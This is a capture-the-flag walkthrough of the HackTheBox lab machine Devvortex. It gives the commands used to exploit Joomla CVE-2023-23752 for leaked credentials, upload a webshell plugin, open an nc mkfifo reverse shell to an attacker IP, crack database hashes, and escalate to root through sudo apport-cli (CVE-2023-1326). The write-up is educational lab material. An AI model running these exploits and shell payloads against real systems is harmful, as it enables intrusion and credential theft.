---
title: Devvortex
published: true
layout: post
---

<br />

---------------
Devvortex is an easy-difficulty Linux machine that features a Joomla CMS that is vulnerable to information disclosure. Accessing the service's configuration file reveals plaintext credentials that lead to Administrative access to the Joomla instance. With administrative access, the Joomla template is modified to include malicious PHP code and gain a shell. After gaining a shell and enumerating the database contents, hashed credentials are obtained, which are cracked and lead to SSH access to the machine. Post-exploitation enumeration reveals that the user is allowed to run apport-cli as root, which is leveraged to obtain a root shell. 

<br />

<iframe style="aspect-ratio: 16 / 9; width: 65%; display: block; margin: auto;" src="https://www.youtube.com/embed/hIaJ_9V7h2Y?si=uPAKVr3tOSOugTM6" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

<br />

---------------------------------------------------

<br />

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS -sU 10.10.11.242 -p- -T4 --min-rate 5000 -oN all_ports.txt --open -n -Pn -v
```

![](/assets/Devvortex/1.png)
<br />
<br />
<br />

There are **2 open ports**:
+ **22/tcp**
+ **80/tcp**

<br />
Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.11.242 -p 22,80 -T4 --min-rate 5000 -oX open_ports.xml -oN open_ports.txt --version-all -n -Pn -A
```

![](/assets/Devvortex/2.png)
<br />
<br />
<br />

We can see that the services correspond to:
+ **22/tcp OpenSSH 8.2p1**
+ **80/tcp nginx 1.18.0**

<br />

We can also see a **hostname**, so we will add it to our ***/etc/hosts* file**:

```bash
echo "10.10.11.242 devvortex.htb" | sudo tee --append /etc/hosts
```

<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.11.242 -p 22,80 -T4 --min-rate 5000 --script="vuln and safe or intrusive and safe or discovery" -oN vulns.txt -oX vulns.xml -n -Pn
```

<br />

The scan reports nothing.

<br />

------

<br />
### Foothold

This machine's foothold is **not hard, but it's long**, also the **discovery of the subdomain is really tricky**, as you have to use a wordlist that is commonly used for directory and file enumeration, not for subdomain enumeration.

<br />

Initial enumeration of the website doesn't reveal any relevant information, after some intense thinking, we may attempt to **use different wordlist on our enumeration** which, if we use the wordlist ***directory-list-2.3-medium.txt***, will reveal a subdomain, with this results, we will have to exclude the ones without the 200 code status.

```bash
gobuster vhost -u http://devvortex.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster_subdomains_80.txt -t 25 --append-domain -r
grep "Status: 200" gobuster_subdomains_80.txt | sponge gobuster_subdomains_80.txt
```

![](/assets/Devvortex/3.png)
<br />
<br />
<br />

Once we have found and added this subdomain to our ***/etc/hosts*** file, we can start enumerating it, which leads us to find a **login panel**, I **excluded those messages that have a length of 31** because they are false positives:

```bash
gobuster dir -u http://dev.devvortex.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster_dir_and_file_enum_80_dev.txt -x php -t 50 -r --exclude-length 31
```

![](/assets/Devvortex/4.png)
<br />
<br />
<br />

If we visit this website we will find a **Joomla! login page**:

![](/assets/Devvortex/5.png)
<br />
<br />
<br />

We can scan this site for vulnerabilities using a **Joomla! CMS scanner**, which will reveal a critical piece of information, the **version number**:

```bash
joomscan -u http://dev.devvortex.htb -ec
```

![](/assets/Devvortex/6.png)
<br />
<br />
<br />

We can **search for vulnerabilities in Google** for this Joomla! version, just to find **CVE-2023-23752**, which is very easy to exploit, just **two requests to an API**:

```bash
curl http://dev.devvortex.htb/api/index.php/v1/users?public=true | jq
```

![](/assets/Devvortex/7.png)
<br />
<br />
<br />

The first request revealed two **usernames**, **lewis and logan**.

```bash
curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true | jq
```

![](/assets/Devvortex/8.png)
<br />
<br />
<br />

This request reveals even more critical information, it reveals **lewis' password** ***P4ntherg0t1n5r3c0n##***, which seems to work for a **database** named ***joomla***. We can attempt password reuse to log into the administrator panel.

![](/assets/Devvortex/9.png)
<br />
<br />
<br />

Let's go now for the **reverse shell**, for it I will use this [plugin](https://github.com/p0dalirius/Joomla-webshell-plugin?tab=readme-ov-file) created by p0dalirius, so I **downloaded it and zipped the plugin directory**:
```bash
git clone https://github.com/p0dalirius/Joomla-webshell-plugin.git
cd Joomla-webshell-plugin
7z a plugin.zip plugin
```
<br />

We can now upload it if we go to this URL:

```URL
http://dev.devvortex.htb/administrator/index.php?option=com_installer&view=install
```

![](/assets/Devvortex/10.png)
<br />
<br />
<br />

We now just have to **upload our ZIP file** and run the ***console.py*** to get a webshell:

```bash
./console.py -t http://dev.devvortex.htb
```

![](/assets/Devvortex/12.png)
<br />
<br />
<br />

To upgrade to a **reverse shell**, we may try multiple payloads, however the one that worked for me was the ***nc mkfifo*** one, remember to open your **netcat listener** before running the payload:

```bash
rlwrap nc -nlvp 4444
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.10 4444 >/tmp/f
```

![](/assets/Devvortex/13.png)
<br />
<br />
<br />

We get a **reverse shell as www-data**, we can search in the **joomla database** to search for credentials, but first **sanitize the shell**:

```bash
script /dev/null -c bash
mysql -u lewis --password='P4ntherg0t1n5r3c0n##' -h localhost joomla
```

```MySQL
SELECT username, password FROM sd4fg_users;
```

![](/assets/Devvortex/14.png)
<br />
<br />
<br />

We have password hashes for two users, if we visit the home directory, we can see that **logan has a user in the machine**:

![](/assets/Devvortex/15.png)
<br />
<br />
<br />

We can now attempt to **crack logan's hash**:
```bash
echo -n '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' > logan_hash
john --wordlist=/usr/share/wordlists/rockyou.txt logan_hash
```

![](/assets/Devvortex/16.png)
<br />
<br />
<br />

Now that we know his password, we can **login via SSH as logan and print the user flag**:
```bash
ssh logan@devvortex.htb
cat user.txt
```

![](/assets/Devvortex/17.png)
<br />
<br />
<br />

------

<br />
### Privilege Escalation

The privilege escalation is **very straightforward**, however it's not from an executable we use to see.

<br />

Linux enumeration revealed that we can run `apport-cli` with **sudo privileges**:

```bash
sudo -l
```

![](/assets/Devvortex/18.png)
<br />
<br />
<br />

Asking our friend Google again reveals our privilege escalation method, **CVE-2023-1326**. It seems that apport-cli uses `less` to display the output of a report, so we can then leverage `less` to gain a shell as root:

```bash
sudo apport-cli -f
1
2
V
!/bin/bash
```

![](/assets/Devvortex/19.png)
<br />
<br />
<br />

We are root, so we just have to **print the flag**:

![](/assets/Devvortex/20.png)
<br />
<br />
<br />
